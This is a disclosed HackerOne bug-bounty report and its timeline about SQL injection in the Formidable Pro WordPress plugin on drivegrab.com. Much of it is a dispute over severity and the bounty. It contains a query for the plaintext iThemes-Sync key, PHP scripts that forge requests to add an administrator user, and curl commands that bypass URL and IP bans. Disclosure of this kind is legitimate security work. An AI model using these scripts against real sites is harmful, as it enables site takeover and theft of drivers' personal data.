---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/sql-injection
  - env/web
substate: "resolved"
weakness: "SQL Injection"
enriched: true
date: 2017-11-17
submitted: 2017-10-03T00:38:43.321Z
bounty_usd: 4500
votes: 205
cve: []
program: "[[programs/grab|Grab]]"
reporter: "jouko"
source: "https://hackerone.com/reports/273946"
title: "www.drivegrab.com SQL injection"
---
# www.drivegrab.com SQL injection

> **Severity:** High | **Bounty:** 4,500 USD | **Votes:** 205 | **Program:** Grab | **Disclosed:** 2017-11-17

- Report: [https://hackerone.com/reports/273946](https://hackerone.com/reports/273946)
- CWE: SQL Injection
- Submitted: 2017-10-03T00:38:43.321Z

## Report summary

The researcher reported that it was possible to exploit previously unknown SQL injection in a WordPress plugin called Formidable Pro which was fixed immediately. He was able to gain read access on wordpress database and provided us all the relevant details (PoC) required for us to reproduce the issue.

_**As also stated on our Policy page:**_

```
Our rewards are impact-based. This means, for example, that we will issue a relatively high reward
for a vulnerability that has the potential to leak complete dataset of confidential data, but that we
will issue  lower reward for a vulnerability that allows an attacker to access to an isolated and limited
dataset. When we have our reward meetings, we always ask one question: If a malicious attacker
abuses this, how bad off are we? We assume the worst and pay out the bug accordingly.

If a single fix fixes multiple vulnerabilities, we treat this as a single vulnerability. 
For example, if you find 3 vulnerabilities in a WordPress plugin we use, and our fix is to remove 
the plugin, this will receive a single bounty, determined, as always, by impact.
```

Therefore, in order to be able to accurately identify the overall impact on business, we further investigated to find out the extent of data leakage. During our investigation, we found that database was storing a dataset (representing ~0.6%) containing our driver partners PII.

Researcher also reported 2 other different security issues on same plugin, Formidable Pro. All the 3 vulnerabilities reported were on the latest plugin, and having no updates available at the time by the plugin developers. Deleting the plugin was a single fix.

After assigning the severity based on the data exposure the researcher pointed out that, there is a way to pivot from the DB to wordpress admin dashboard exploiting iThemes-Sync authentication key which was exposed in a database. After our investigation we believe that pivoting was not possible in the context because of the server hardening. We fairly asked him to show specific evidence of his new finding in order to reassess the bounty. Because the SQL injection was already fixed the researcher was not able to perform any remote code execution but he did provided PoC for helping us to reproduce the RCE. From his understanding the only values required for performing RCE was user id and authentication key (which was stored in plaintext in a DB).

While investigating this RCE using researcher's provided PoC we figured out that those two values are not enough for reproducing the RCE because of the following error message:

```
The hash could not be validated as a correct hash.
```

On checking with ithemes developers  on email, they responded with the following:

```
We're using randomly generated salts for each site to build the hashes, but we can't go into specifics, for obvious security reasons.
```

Since neither we or the researcher were able to confirm the RCE we couldn't reassess the bounty.

Based on above data points collected through our investigation, we decided to award the researcher 4500 USD. Also, to appreciate the researcher for spending valuable time and efforts in submitting other 2 detailed bug reports to us, on the same plugin. Since these 2 bug reports were considered duplicate because of single fix, yet we decided to award 250 USD on each duplicate bug report as well.

Needless to say, we take ALL reported vulnerabilities, very seriously and investigate them to best of our technical abilities. We have awarded 10,000 USD bounty to researchers, who have submitted vulnerabilities with critical impact, in the past and we will continue to do so in the future as well. 

At the end of the day, all these efforts made by H1 triage team, H1 researchers and Grab security team, comes down to overall risk and impact to the business. However, we always aim to be fair. Some researchers won't agree with some of our decisions, but we're paying out to the best of our ethical ability and trust that the majority of researchers will consider their rewards fair and in many cases generous.

We would like to once again thank the researcher for his great report and allowing us to fix this issue. We really appreciate his help in keeping Grab and our customers safe and secure.

## Timeline

- **Report Filed**
- **2017-10-03** @jouko: One more thing: www.drivegrab.com is served through CloudFlare. The host "████████" resolves to ██████ which appears to be the real IP of the website. If CloudFlare is used to prevent DoS or other attacks, this may be a problem. It can also expose the server to other attacks. I won't report this separately.

The IP can be verified with:
~~~~
curl -k -s -i 'https://██████████/' -H 'Host: www.drivegrab.com'
~~~~
- **Report Triaged**
- **2017-10-03** @nozz_: About your CloudFlare misconfiguration which leads to real IP disclosure could you please create another hackerone submission ? We would like to evaluate the impact of each of your findings separately.

Thank you
- **2017-10-03** @jouko: ok
- **2017-10-03** @jouko: As for the fix, the most obvious would seem to be removing this:
~~~~
add_action('wp_ajax_nopriv_frm_forms_preview', 'FrmFormsController::preview);
~~~~
It's located in FrmHooksController.php. I haven't used this software apart from this testing, so I can't guarantee this change wouldn't break anything. But I don't know why an unauthenticated user would need to "preview" a form, as it sounds like something only administrators do while creating the forms.

I think it would prevent this and some other problems (e.g. XSS in another report). That AJAX function opens a lot of attack surface because there are many shortcodes an attacker could try to exploit. Some of them seem bad. There are shortcodes that probably display non-public data from the entries database.

There is another SQL injection in another shortcode. It's in the LIMIT clause and I'm not sure if it's exploitable. Maybe I should report these in separate bug reports after checking them through.

There are many other wp_ajax_nopriv_ hooks which may be dangerous too. Some of them are probably necessary so it's not a good idea to remove them without careful testing.
- **2017-10-03** @nozz_: Hello again @jouko.

Could you please help us to verify the fix for your 3 submissions related to `Formidable Pro` plugin  ?
- **2017-10-03** @jouko: Yes, the unauthenticated frm_forms_preview AJAX call seems to be disabled now so the exploits using it are no longer possible.
- **Report Severity Updated**
- **Report Severity Updated**
- **Report Resolved**
- **2017-10-09** @jouko: It is a little surprising that the severity is changing between critical, medium and high.

This bug gives the attacker all information stored in the database, including the list of drivers and their details. There are also many ways to escalate this to server-side code execution. One way is to crack the administrator passwords. If they aren't crackable, there are many other ways.

One example is via the iThemes-Sync plugin that was active on the server. It stores iThemes authentication keys in the WordPress database (table "█████████" in this case). They can be easily retrieved with the SQL injection.

With an iThemes-Sync authentication key, the attacker can execute any code on the server. It has functions for e.g. installing new plugins or adding new WordPress users.

I didn't demonstrate these escalations because I thought it's more important to report critical bugs as quickly as possible and I thought you'd recognize the severity of the issue.
- **2017-10-09** @jouko: Also, do you object to me reporting these bugs to the software developer? Currently all other users of the plugin are vulnerable. I asked about this a week ago in #272683.
- **2017-10-10** @nozz_: Hello @jouko

First of all thank you for your remarks. We have investigated all your submissions to evaluate the impact as fairly as possible. In your report you did not demonstrate any way to pivot from the DB to system level. After our investigation we believe that pivoting was not possible in that context because of the following reasons :

- Strong Password policy are enforce
- Password Expiration are setup
- All password are stored with a strong hash algorithm and salted.
- The DB access was limited to read access only
- The Wordpress instance is hardened with Sucuri Sec plugin 

About the iThemes-Sync authentication key there do not appear to be any security implications as a direct result of this key exposure. Did you have access to the key in plaintext? We would need to see specific evidence showing how that key can be use for performing any RCE.

Note that we are involving hackerone team for evaluate your finding as fair as possible.

We appreciate your help in keeping Grab and our customers safe and secure.
- **2017-10-10** @jouko: Yes, iThemes sync stores the authentication key in plain text. It can be retrieved with the SQL query
~~~~
SELECT option_value FROM ██████ WHERE option_name='ithemes-sync-cache'
~~~~

You (and the attacker) would get a PHP-serialized result such as
~~~~
a:4:{s:15:"authentications";a:1:{i:123;a:4:{s:3:"key";s:10:"(KEY HERE)";s:9:"timestamp";i:1507622913;s:10:"local_user";s:4:"test";s:8:"username";s:4:"test"}}s:12:"use_ca_patch";b:0;s:9:"show_sync";b:1;s:7:"use_ssl";b:1;}
~~~~

The iThemes-specific user id in this example is 123. The associated authentication key is "(KEY HERE)".

These two variables are all the attacker needs to gain access to the administrative functions. I made a script to demonstrate this. I was able to add a new administrator user on my test server by using only the user id and authentication key taken from the database.

~~~~php
<?php

// fill in these two, run from command line: php this_script.php
$user_id='123';
$key='(KEY HERE)';

$action='manage-users';

$newuser=array();
$newuser[0]=array();
$newuser[0][0]=array();
$newuser[0][0]['user_login']='newuser';
$newuser[0][0]['user_pass']='newpass';
$newuser[0][0]['█████████']='foo@foo.com';
$newuser[0][0]['role']='administrator';

$args=array();
$args['add']=$newuser;

$salt='A';

$hash=hash('sha256',$user_id.$action.json_encode($args).$key.$salt);

$req=array();
$req['action']=$action;
$req['arguments']=$args;
$req['user_id']=$user_id;
$req['salt']=$salt;
$req['hash']=$hash;

$data='request='.json_encode($req);
echo("sending: $data\n");

$c=curl_init();
curl_setopt($c, CURLOPT_URL,'https://www.drivegrab.com/?ithemes-sync-request=1');
curl_setopt($c, CURLOPT_POSTFIELDS, $data);
$res=curl_exec($c);

echo("response: ".json_encode($res)."\n");

?>
~~~~

Handling of the iThemes-Sync request happens in ``wp-content/plugins/ithemes-sync/request-handler.php``.  Authenticating the request is done in function ``parse_request()`` in this way:

~~~~php
                $hash = hash( 'sha256', $request['user_id'] . $request['action'] . $this->json_encode( $request['arguments'] ) . $user_data['key'] . $request['salt'] );
                
                if ( $hash !== $request['hash'] ) {
                        $this->send_response( new WP_Error( 'hash-mismatch', 'The hash could not be validated as a correct hash.' ) );
                }
~~~~
The hash calculation is simply replicated in my exploit above. The "salt" variable can be freely chosen (in the example just 'A'). The only unknown variables are ``user_id`` and ``key`` which can be retrieved with the SQL injection.

Adding a new user isn't probably the way a real attacker would do because it's easily detectable. The authentication key gives the attacker a lot of other possibilities. The plugin supports 43 other functions ("verbs") that can be used instead of ``manage-users`` any "verbs" , e.g. ``manage-plugins`` (to download, install, activate, deactivate, or uninstall plugins).  All the possible verbs are in the ``wp-content/plugins/ithemes-sync/verbs/`` directory.
- **Bounty Awarded**
- **2017-10-13** @nozz_: Hello @Jouko,

Thank you again for your reply. We have rewarded your finding according to the data impacted, ease of exploit and overall risk to Grab customers, drivers and Grab.
Unfortunately we did not consider possible to perform any code execution even with your additional information. We tried to reproduce your PoC against our systems but this one is not working mainly because of that environments are not totally similar and our instance is hardened.

Since you had access to the DB and iThemes-Sync `user id`/`authentication key` you should be able to reproduce this RCE against our system. We would need to see specific evidence to reassess your bounty.

We appreciate your help in keeping Grab and our customer secure.
- **2017-10-13** @jouko: I didn't retrieve the authentication key. Retrieving data with a blind SQL injection puts a heavy load on the server and it seemed very slow already. Downloading sensitive data could be also viewed a violation of privacy so I limited my access to minimum.  Surely me trying to respect your privacy and ensure your servers stay operational shouldn't be a basis for dismissing vulnerabilities.

It can't be a matter of opinion whether the vulnerability exists or not. If it "is not working", maybe you could tell me how it is not working. Do you get an error message, or what happens?

I can contact iThemes and ask them to confirm that their Sync plugin can be controlled with the plaintext key. If you give me the key and user id, I can try to reproduce it.
- **2017-10-17** @dukefleed: Hi @jouko,

Thanks again for your efforts, that was a great find!
After long discussions internally, and based on CVSS V3 and also our business logic, we have made sure that the risk score here is **High** due to multiple factors including but not limited to: the affected domain, the hardening measures in place, the password policy and the SQL server hardening.
That defense in depth techniques would maintain the impacted scope, integrity and availability impact which will lower the risk to **High**.
Thanks and we look forward to working with you on future reports.

Keep hunting!
@dukefleed
- **2017-10-17** @jouko: With the so called hardening you probably refer to the server returning a 403 error if the URL contains "ithemes-sync-request". I'm not sure if this was put in place before or after this report, but in any case it can be bypassed by encoding the parameter:

~~~~
curl -s -i 'https://www.drivegrab.com/?ithemes-sync-reques%74=1' --data 'request={"action":"manage-users","arguments":{},"user_id":"123","salt":"A","hash":"B"}' -H 'X-Forwarded-For: 123.1.2.3'
~~~~
The X-Forwarded-For is there because for some reason my normal IP was banned from accessing the site.

Response:
~~~~
██████████

{"errors":{"user-not-authenticated":"The requested user is not authenticated."},"verb_time":false}
~~~~
This response is generated in request-handler.php, just before the hash check I described above, just as expected. Code:
~~~~php
                if ( ! isset( $this->options['authentications'][$request['user_id']] ) ) {
                        $this->send_response( new WP_Error( 'user-not-authenticated', 'The requested user is not authenticated.' ) );
                }
                
                $user_data = $this->options['authentications'][$request['user_id']];
                
                $hash = hash( 'sha256', $request['user_id'] . $request['action'] . $this->json_encode( $request['arguments'] ) . $user_data['key'] . $request['salt'] );

~~~~
With a correct user_id and key the check is passed and the user management function executed. This is a remote code execution. You can't just say "it is not working" or "hardened" or "not totally similar". The system obviously executes the vulnerable code. It's working perfectly up to the point where the user id and plaintext key is needed.  Banning specific URLs or IP's is just security by obscurity and has no bearing on the vulnerability itself.
- **2017-10-18** @jouko: Here's an updated script with additional tricks to bypass the IP and URL bans.

~~~~php
<?php

// fill in these two
$user_id='123';
$key='(KEY HERE)';

$action='manage-users';

$newuser=array();
$newuser[0]=array();
$newuser[0][0]=array();
$newuser[0][0]['user_login']='newuser';
$newuser[0][0]['user_pass']='newpass';
$newuser[0][0]['██████████']='foo@foo.com';
$newuser[0][0]['role']='administrator';

$args=array();
$args['add']=$newuser;

$salt='A';

$hash=hash('sha256',$user_id.$action.json_encode($args).$key.$salt);

$req=array();
$req['action']=$action;
$req['arguments']=$args;
$req['user_id']=$user_id;
$req['salt']=$salt;
$req['hash']=$hash;

$data='request='.json_encode($req);
echo("sending: $data\n");

$c=curl_init();
curl_setopt($c, CURLOPT_URL,'https://www.drivegrab.com/?ithemes-sync-reques%74=1');
curl_setopt($c, CURLOPT_HTTPHEADER, array('User-Agent: Mozilla','X-Forwarded-For: 123.1.2.3'));
curl_setopt($c, CURLOPT_POSTFIELDS, $data);
$res=curl_exec($c);

echo("response: ".json_encode($res)."\n");
?>
~~~~
- **2017-10-19** @nozz_: Hello @jouko

Thank you again for your additional information regarding the impact of your finding. 

We would like to inform you that according to Hackerone's team point of view and our investigation we consider that your bounty is appropriate to your finding. As a reminder this domain is out-of-scope which means normally not eligible for any bounty. Nevertheless because of your high impact finding, your great report and for the time spent we decided to reward you 4500$.

Also noted that to avoid any confusion in a future please provide all the evidences for each vulnerabilities found in your first report. 

Thank you for working with us. We are looking forward to see more of your bug reports.
- **2017-10-19** @jouko: Your policy page says not only that drivegrab.com is in scope and "critical", i.e. one of the most important targets. Did I misunderstand? Also from the policy page one could understand that disclosure of personal information (licence numbers explicitly mentioned) would be a critical issue. This bug gave the attacker access to this information (drivers' personal information including licence numbers, as we know from another bug on this site, which by the way wasn't considered critical by you either). So it seems that based on your stated policy, this issue was critical, even without the remote code execution.
- **2017-10-19** @jouko: This is so clearly wrong that I'll make a mediation request. It's worrying if HackerOne really endorses this kind of way of doing business. I think there should be a wider discussion about the ethics on the bounty offerers' behalf. For me, these problems are the main reason I don't do more bug bounties (I just had an over a year's break). From what I've heard, I'm not the only one. More experts will participate bug bounties if they can trust that their work will be compensated as promised and the reports are treated reasonably. Less of them will participate if this practice continues.
- **2017-10-20** @nozz_: It is in fact true that website is in scope, mea cupla. Jouko we understand your point of view but we have rewarded your finding according to the data impacted and we believe this bounty is fair enough regarding the number of personal data involved.

To be as fair and objective as possible we are waiting for the hackone team reply.
- **2017-10-20** @jouko: As you know, the database contained PII (names, email addresses, mobile numbers, licence plates) of almost ██████████ drivers, and that was just one of the many forms stored in the Formidable database. How many customers or drivers would have to be affected for a critical impact? 100,000? Million?

You no longer seem to dispute that remote code execution was also possible and the server is in fact in scope and in the most critical tier. Yet that hasn't for some reason been reflected in the severity classification.

Have you actually read your own policy page? The reality of handling this bug is seriously out of sync with it. If you have no intention to follow the policies outlined on the page, then you are intentionally deceiving researchers to get free workforce. I strongly doubt that HackerOne would endorse this kind of activity. A business relying on trust and ethics couldn't operate like that.

This makes you wonder, if this isn't considered critical, WHAT is? It is actually difficult to imagine a more serious vulnerability affecting a single web service.

The reason I had to provide further information later is that you immediately classified this as critical, within minutes of the report. I thought it was obvious and it didn't cross my mind that you'd start disputing this later. The medium->high classification came a week later, for reasons that nobody still seems to know, and apparently because of misunderstandings about the impact and scope.
- **2017-11-08** @jouko: In my discussions with HackerOne it has become even more clear that there was no legitimate reason to downgrade the severity of this bug. Several of the Formidable bugs exactly fulfill your specific criteria of "critical" and this is probably the clearest case.

I'll be releasing a write-up about these bugs tomorrow. My blog posts are mainly about the technical side but I usually also briefly mention the bug bounty process. In this case maybe not so briefly because there has been so many conflicting explanations for the non-critical severity assessment.

This case came up already in a discussion with a reporter already almost 3 weeks ago (it was about other vulnerability findings - I didn't mention GrabTaxi or the bounty problems because at that point I had no reason to suspect this would happen, it was still "critical" at the time). He asked me to give a heads-up when I'm publishing the 0-days. They affected over 200,000 active WordPress installations and probably millions of people so I'd expect there may be some media attention.

It seems also likely that the bounty process will raise some eyebrows to say the least. Unless you object I'll give the media your contact details so you can equally present your view of what happened.

My view is that your bounty assessment was not done in good faith. The severity was downgraded without a valid reason to avoid paying the appropriate bounty. This was justified with several falsehoods made up by you and HackerOne.

The last explanation from HackerOne was maybe the most ludicrous: that third party software like WordPress plugins are out of scope and I should't have received any bounty at all! I thought I couldn't be surprised anymore but yes, I was again surprised at how low a supposedly reputable company can go. This rationale was never mentioned before and in fact WordPress plugin vulnerabilities are mentioned as an example of a valid bug on your policy page.

You've been very determined to harm my livelihood. I don't understand how you expect anyone to accept that. Normally this would be basis for legal action. It may be technically legal in the bug bounty context but not any more ethical. The least I can do is to warn other researchers about this program.
- **2017-11-09** @jouko: FYI, some unexpected family business came up and I can't finish the write-up today (I'll include all Formidable bugs + iThemes Sync trick in the post so it's quite long). I'll probably have to delay it until Monday.
- **Agreed On Going Public**
- **Manually Disclosed**
- **2017-11-17** @jouko: The iThemes-Sync RCE vector can't be a matter of opinion. It's obvious from viewing the code, and anyone can install the plugin and replicate the exploit with the script above. You asked me to replicate this on your server, then refused to give me the key to do so. This looks very bad to me.

You have specified this website is *critical* and PII access a critical vulnerability. The SQL injection grants access to *all* data in the website's database. Just one of the forms I checked contained names, email addresses, mobile numbers, and licence plate numbers of almost ████ drivers (why was this number censored above?) and other forms contained more. This is in addition to all other data on the system, like employee accounts and order tracking, customer, and payments data.

If the system in fact does not contain any critical information, then the classification as critical seems wrong and can be seen as deceptive by researchers who trust your policy page.
- **2017-11-17** @jouko: For some reason you've also censored the string "user_email" is the PoC code. It's not sensitive information but  prevents people from independently checking whether the exploit script works or not. 

Corrected line:
~~~~ php
$newuser[0][0]['user_email']='foo@foo.com';
~~~~

There's also a working example at https://klikki.fi/ithemes-sync.txt .
- **2017-11-19** @jouko: The summary says:

> we figured out that those two values are not enough for reproducing the RCE

HackerOne co-founder Alex Rice notes on [Twitter](https://twitter.com/senorarroz/status/931988860069801985) that the plugin "of course" works as I described, i.e. the two values, stored in plain text, are enough to achieve remote code execution.

All of the plugin's core functionality happens through this interface and this authentication. iThemes's servers use this interface to communicate with Grab's server. If they had incompatible authentication methods, this software would do basically nothing but malfunction.

The suggested possibility that someone would have implemented an alternative authentication method between Grab and iThemes, neither being aware of it, before anybody knew about this weakness, seems nonsensical. Another misunderstanding or error on Grab's behalf seems a much more likely scenario.

I've added a step-by-step guide for reproducing the RCE in the end of this post: https://klikki.fi/adv/formidable.html

We can all review the code. There should be no room for speculation about what it does or how it works.
- **2017-11-21** @jouko: Just for the record, I requested public disclosure of this report on October 17. The request has since then disappeared from the timeline. It is present in my screenshots and saved versions of this page at least until November 8. It was probably removed at the same time with other information like the number of exposed PII entries and partial censoring of PoC code.
{F241341}

I think this case is a good example of the importance of transparency when dealing with vulnerability information. There are [reports](https://wpvulndb.com/vulnerabilities/8945) that these bugs were exploited in the wild after Strategy11 fixed them on GitHub, but before I published my write-up (against repeated demands and warnings from H1) on November 13.

Servers were compromised by exploiting the Formidable shortcode problem described in this report, in conjunction with a weakness in another WordPress plugin, apparently in late October. Of course those two compromised sites mentioned on WPVulnDB almost certainly are not the only cases. It seems probable that had my disclosure request been promptly accepted, or without the strong demands of non-disclosure until November 13, some or all of these incidents could have been avoided.
- **2017-11-23** @jouko: I was hoping for an actual technical explanation as to why the iThemes Sync RCE vector wouldn't work on this server. If it didn't, then it would have been in everyone's interest to clarify the situation even on this point. It would have been simple to figure it out and resolve one of the main problems of this bounty process.

The only theoretically possible (though implausible) reason proposed so far is that someone had "hardened" the plugin in a way that broke the authentication protocol. Showing presence of modifications in the plugin files would have been a matter of minutes. In practice, something like `ls -l` output would indicate this.

Instead, consistently following the chosen strategy, Grab has now removed the iThemes Sync plugin from the server altogether - despite denying it presented any security risk. Unlike some other WordPress plugins that were recently disabled there, this one seems to have been completely wiped from the filesystem. Presence of plugin files under webroot can be checked via HTTP.

This probably means nobody can test the PoC or the theory of "modified version" any more. We just have to trust that there was an unknown reason, which nobody cared to figure out, why the RCE that works everywhere else didn't work on this server.
